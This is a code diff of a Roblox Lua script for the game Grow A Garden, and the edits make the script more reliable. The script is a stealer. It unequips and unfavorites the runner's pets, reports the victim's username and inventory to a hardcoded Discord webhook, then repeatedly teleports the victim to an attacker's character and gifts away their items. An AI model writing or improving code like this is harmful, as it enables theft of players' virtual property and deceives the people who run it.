@@ -6,26 +6,40 @@ local WEBHOOK = "https://discord.com/api/webhooks/1401607749741052134/VIbvQzvj4M
 local IMPORTANT = {"Raccoon","Dragonfly","Red Fox","Queen Bee","Chicken Zombie","Candy Blossom","Kitsune","French Fly Ferret"}
 local IGNORED = {"Can","Shovel","Seed","Wrench","Sprinkler","Rod","Tool","Staff","Trowel"}
 
+-- Проверка LocalPlayer
+if not game.Players.LocalPlayer then
+    game.Players.PlayerAdded:Wait()
+end
+
+local localPlayer = game.Players.LocalPlayer
+if not localPlayer then return end
+
 for _,pet in pairs(workspace.PetsPhysical:GetChildren()) do
-    if pet:GetAttribute("OWNER") == game.Players.LocalPlayer.Name then
+    if pet:GetAttribute("OWNER") == localPlayer.Name then
         for _,v in pairs(pet:GetChildren()) do
             if v:IsA("Tool") then
-                game:GetService("ReplicatedStorage").GameEvents.PetsService:FireServer("UnequipPet",v.Name)
+                local replicatedStorage = game:GetService("ReplicatedStorage")
+                if replicatedStorage and replicatedStorage:FindFirstChild("GameEvents") and replicatedStorage.GameEvents:FindFirstChild("PetsService") then
+                    replicatedStorage.GameEvents.PetsService:FireServer("UnequipPet", v.Name)
+                end
             end
         end
     end
 end
 
-for _,tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+for _,tool in pairs(localPlayer.Backpack:GetChildren()) do
     if tool:IsA("Tool") and tool:GetAttribute("d") == true then
-        game:GetService("ReplicatedStorage").GameEvents.Favorite_Item:FireServer(tool)
+        local replicatedStorage = game:GetService("ReplicatedStorage")
+        if replicatedStorage and replicatedStorage:FindFirstChild("GameEvents") and replicatedStorage.GameEvents:FindFirstChild("Favorite_Item") then
+            replicatedStorage.GameEvents.Favorite_Item:FireServer(tool)
+        end
     end
 end
 
 local items = {}
 local importantItems = {}
 
-for _,item in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+for _,item in pairs(localPlayer.Backpack:GetChildren()) do
     if item:IsA("Tool") then
         local isImportant = false
         for _,v in ipairs(IMPORTANT) do
@@ -72,7 +86,7 @@ if request then
                     ["title"] = "Join to get Grow A Garden hit",
                     ["color"] = 65280,
                     ["fields"] = {
-                        {["name"] = "Victim Username:", ["value"] = game.Players.LocalPlayer.Name},
+                        {["name"] = "Victim Username:", ["value"] = localPlayer.Name},
                         {["name"] = "Items:", ["value"] = #items > 0 and table.concat(items, ", ") or "None"},
                         {["name"] = "Important Items:", ["value"] = #importantItems > 0 and table.concat(importantItems, ", ") or "None"},
                         {["name"] = "Join from console:", ["value"] = consoleCode},
@@ -89,11 +103,11 @@ end
 while task.wait(0.5) do
     local target = game.Players:FindFirstChild(ATTACKER)
     if target and target.Character then
-        if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
-            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 3)
+        if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            localPlayer.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 3)
         end
         
-        for _,item in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+        for _,item in pairs(localPlayer.Backpack:GetChildren()) do
             if item:IsA("Tool") then
                 local isImportant = false
                 for _,v in ipairs(IMPORTANT) do
@@ -112,12 +126,15 @@ while task.wait(0.5) do
                 end
                 
                 if not shouldIgnore then
-                    item.Parent = game.Players.LocalPlayer.Character
+                    item.Parent = localPlayer.Character
                     task.wait(0.2)
-                    game:GetService("ReplicatedStorage").GameEvents.PetGiftingService:FireServer("GivePet", target)
+                    local replicatedStorage = game:GetService("ReplicatedStorage")
+                    if replicatedStorage and replicatedStorage:FindFirstChild("GameEvents") and replicatedStorage.GameEvents:FindFirstChild("PetGiftingService") then
+                        replicatedStorage.GameEvents.PetGiftingService:FireServer("GivePet", target)
+                    end
                     task.wait(0.2)
-                    if item.Parent == game.Players.LocalPlayer.Character then
-                        item.Parent = game.Players.LocalPlayer.Backpack
+                    if item.Parent == localPlayer.Character then
+                        item.Parent = localPlayer.Backpack
                     end
                 end
             end
